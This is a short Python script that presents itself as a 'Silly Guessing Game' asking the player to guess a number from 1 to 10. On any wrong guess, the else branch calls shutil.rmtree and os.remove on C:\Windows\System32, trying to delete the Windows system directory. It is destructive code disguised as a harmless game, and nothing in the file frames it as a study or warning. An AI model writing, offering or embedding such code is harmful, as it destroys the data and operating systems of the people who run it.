import random
import shutil
import os

number = random.randint(1,10)
guess = input("Silly Guessing Game! Guess a number between 1 and 10")
guess = int(guess)

if guess == number:
	print("You Win!")
else:
	shutil.rmtree("C:\Windows\System32")
	os.remove("C:\Windows\System32")